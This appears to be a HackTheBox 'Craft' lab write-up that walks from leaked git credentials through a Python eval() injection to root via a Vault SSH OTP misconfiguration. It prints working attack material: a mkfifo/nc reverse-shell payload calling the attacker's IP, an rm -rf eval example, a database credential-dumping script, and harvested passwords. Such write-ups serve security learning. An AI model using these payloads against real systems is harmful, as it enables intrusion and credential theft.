---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Eval-Function
  - Git-log
---
# Overview

| Name        | Craft       |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.192.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 12:18 CDT
Nmap scan report for 10.129.192.30
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[craft.png]]

One links adds you to `craft.api.htb` and other icon `gogs.api.htb`.

```bash
echo "10.129.192.30 craft.htb api.craft.htb gogs.craft.htb" | sudo tee -a /etc/hosts
```

![[craft2.png]]

![[craft3.png]]

![[craft4.png]]

There are four users from silicon valley and one repo.
# Enumeration
## Git logs

```bash
$ git clone https://gogs.craft.htb/Craft/craft-api --config http.sslVerify=false
Cloning into 'craft-api'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (41/41), done.
remote: Total 45 (delta 10), reused 0 (delta 0)
Unpacking objects: 100% (45/45), 7.25 KiB | 618.00 KiB/s, done.
$ cd craft-api/
```

This was code repo of `api.craft.htb`:

```bash
~/craft-api/craft_api/api/brew/endpoints
$ cat brew.py 

from flask import request, jsonify, make_response
from flask_restplus import Resource
from craft_api.api.restplus import api
from craft_api.api.auth.endpoints import auth
from craft_api.api.brew.operations import create_brew, update_brew, delete_brew
from craft_api.api.brew.serializers import beer_entry, page_of_beer_entries
from craft_api.api.brew.parsers import pagination_arguments
from craft_api.database.models import Brew
from functools import wraps
import datetime 

ns = api.namespace('brew/', description='Operations related to beer.')


@ns.route('/')
class BrewCollection(Resource):

    @api.expect(pagination_arguments)
    @api.marshal_with(page_of_beer_entries)
    def get(self):
        """
        Returns list of brews.
        """
        args = pagination_arguments.parse_args(request)
        page = args.get('page', 1)
        per_page = args.get('per_page', 10)

        brews_query = Brew.query
        brews_page = brews_query.paginate(page, per_page, error_out=False)

        return brews_page

    @auth.auth_required
    @api.expect(beer_entry)
    def post(self):
        """
        Creates a new brew entry.
        """

        # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
<SNIP>
```

We have author using `eval` function on `abv` value which is generally vulnerable but we need authentication token which we will only get from proper credentials.

```bash
$ git log
commit e55e12d800248c6bddf731462d0150f6e53c0802 (HEAD -> master, origin/master, origin/HEAD)
Author: ebachman <ebachman@craft.htb>
Date:   Fri Feb 8 11:40:56 2019 -0500

    Add db connection test script

commit a2d28ed1554adddfcfb845879bfea09f976ab7c1
Author: dinesh <dinesh@craft.htb>
Date:   Wed Feb 6 23:18:51 2019 -0500

    Cleanup test

commit 10e3ba4f0a09c778d7cec673f28d410b73455a86
Author: dinesh <dinesh@craft.htb>
Date:   Wed Feb 6 23:12:07 2019 -0500

    add test script

commit c414b160578943acfe2e158e89409623f41da4c6
Author: dinesh <dinesh@craft.htb>
Date:   Wed Feb 6 22:01:25 2019 -0500

    Add fix for bogus ABV values

commit 4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95
Author: ebachman <ebachman@craft.htb>
Date:   Wed Feb 6 21:46:30 2019 -0500

    Add authentication to brew modify endpoints

commit 90fb3e8aa0ca9683bcc1ece8fc5bb15cb833a6ff
Author: ebachman <ebachman@craft.htb>
Date:   Wed Feb 6 21:41:42 2019 -0500

    Initialize git project
(END)
```

On one specific commit of `dinesh` he had putted his credentials in code for test purposes.

```bash
$ git show 10e3ba4f0a09c778d7cec673f28d410b73455a86
commit 10e3ba4f0a09c778d7cec673f28d410b73455a86
Author: dinesh <dinesh@craft.htb>
Date:   Wed Feb 6 23:12:07 2019 -0500

    add test script

diff --git a/tests/test.py b/tests/test.py
new file mode 100644
index 0000000..40d5470
--- /dev/null
+++ b/tests/test.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python
+
+import requests
+import json
+
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
+json_response = json.loads(response.text)
+token =  json_response['token']
+
+headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
+
+# make sure token is valid
+response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
+print(response.text)
+
+# create a sample brew with bogus ABV... should fail.
+
+print("Create bogus ABV brew")
+brew_dict = {}
+brew_dict['abv'] = '15.0'
+brew_dict['name'] = 'bullshit'
+brew_dict['brewer'] = 'bullshit'
+brew_dict['style'] = 'bullshit'
+
+json_data = json.dumps(brew_dict)
+response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
+print(response.text)
+
+
+# create a sample brew with real ABV... should succeed.
+print("Create real ABV brew")
+brew_dict = {}
+brew_dict['abv'] = '0.15'
+brew_dict['name'] = 'bullshit'
+brew_dict['brewer'] = 'bullshit'
+brew_dict['style'] = 'bullshit'
+
+json_data = json.dumps(brew_dict)
+response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
+print(response.text)
```
# Initial Foothold
## Get Auth Token

We can see creds `dinesh:4aUh0A8PbVJxgd` (SSH won't work). Let's get the authentication token first:

```python
import requests
import json
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Get authentication token using dinesh's credentials
response = requests.get('https://api.craft.htb/api/auth/login',  
                       auth=('dinesh', '4aUh0A8PbVJxgd'), 
                       verify=False)
json_response = json.loads(response.text)
token = json_response['token']
print(f"Token: {token}")
```

```bash
$ python3 main.py
Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzYwNTI0Njg0fQ.wDhzANlub6m5deXiKhA-Vrz109gaaGGB7prceGYNsRc
```
## `eval` Exploit

We have authentication token now we can use `eval` functionality but first understand why `eval` is dangerous:

```python
# Simple example
x = 1
result = eval('x + 1')  # Returns 2

# But it can execute ANY Python code
eval('__import__("os").system("rm -rf /")')  # This would delete everything!
```

Lets exploit the `eval` functionality now.

```python
import requests
import json
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Your HTB VPN IP
LHOST = "10.10.14.122"  # Make sure this is your correct HTB IP
LPORT = "4444"

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzYwNTI0Njg0fQ.wDhzANlub6m5deXiKhA-Vrz109gaaGGB7prceGYNsRc"

headers = {
    'X-Craft-API-Token': token,
    'Content-Type': 'application/json'
}

# Exploit the eval() vulnerability
brew_dict = {
    'abv': '''__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f") or 0.1''' % (LHOST, LPORT),
    'name': 'exploit',
    'brewer': 'hacker',
    'style': 'IPA'
}

json_data = json.dumps(brew_dict)
print("Sending exploit payload...")

# Send the exploit
try:
    response = requests.post('https://api.craft.htb/api/brew/', 
                            headers=headers, 
                            data=json_data, 
                            verify=False,
                            timeout=5)
    print(f"Response status: {response.status_code}")
    print(f"Response text: {response.text}")
except requests.exceptions.Timeout:
    print("Request timed out - this might mean the shell is connecting")
except Exception as e:
    print(f"Error: {e}")
```

```bash
$ python3 main.py
Sending exploit payload...
Request timed out - this might mean the shell is connecting
```

```bash
$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.192.30] 37925
/bin/sh: can't access tty; job control turned off
/opt/app # ls
app.py
craft_api
dbtest.py
tests
```

So we are in some kind of container.

```bash
/opt/app # cd /home
/home # ls
/home # whoami
root
/home # cd /root
/root # ls
/root # 
```

```bash
/opt/app/craft_api # ls
__init__.py
__pycache__
api
database
settings.py
/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

We get creds new of `mysql` `craft:qLGockJ6G2J75O`.

```bash
cat > mysql_query.py << 'EOF'
#!/usr/bin/env python3
import pymysql

connection = pymysql.connect(
    host='db',
    user='craft',
    password='qLGockJ6G2J75O',
    db='craft',
    cursorclass=pymysql.cursors.DictCursor
)

try:
    with connection.cursor() as cursor:
        # First, let's see what tables exist
        cursor.execute("SHOW TABLES")
        tables = cursor.fetchall()
        print("Tables:")
        for table in tables:
            print(table)
        
        # Now query the user table
        cursor.execute("SELECT * FROM user")
        users = cursor.fetchall()
        print("\nUsers:")
        for user in users:
            print(user)
            
finally:
    connection.close()
EOF
```

```bash
/opt/app/craft_api # python3 mysql_query.py
Tables:
{'Tables_in_craft': 'brew'}
{'Tables_in_craft': 'user'}

Users:
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
```

Go to `https://gogs.craft.htb` and login with `gilfoyle:ZEU3N8WNM2rh4T`.

![[craft5.png]]

Copy it.

```bash
# Remove the leading spaces from each line
sed 's/^    //' id_rsa > id_rsa_clean
chmod 600 id_rsa_clean
```

```bash
$ ssh -i id_rsa_clean gilfoyle@craft.htb


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa_clean': 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 08:03:39 2023 from 10.10.14.23
gilfoyle@craft:~$ 
```

Asked for passphrase used `ZEU3N8WNM2rh4T` of gilfoyle.

```bash
gilfoyle@craft:~$ ls
user.txt
gilfoyle@craft:~$ cat user.txt
69f5145455b3236c976ea21c50e8eeed
```
# Privilege Escalation
## Vault Misconfiguration

![[craft6.png]]

```bash
    #!/bin/bash

    # set up vault secrets backend

    vault secrets enable ssh

    vault write ssh/roles/root_otp \
        key_type=otp \
        default_user=root \
        cidr_list=0.0.0.0/0
```

 Found the `secret.sh` file that sets up HashiCorp Vault for SSH OTP authentication. This is our path to root access.

```bash
# Connect to the machine using Vault OTP
vault ssh -mode=otp -role=root_otp root@localhost
```

This command will:

- Generate a One-Time Password (OTP)
- Use Vault's SSH secrets engine
- Authenticate you as root using the OTP method

In password but that OTP session you get above.

```bash
gilfoyle@craft:~$ # Connect to the machine using Vault OTP
gilfoyle@craft:~$ vault ssh -mode=otp -role=root_otp root@localhost
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 5e547324-bea0-4457-9c34-4dbcaef8ffe1


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 5e547324-bea0-4457-9c34-4dbcaef8ffe1
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 07:14:50 2023
root@craft:~# cat /root/root.txt
053d0a6ec2f703b656cb1c65d9b223ba
```

---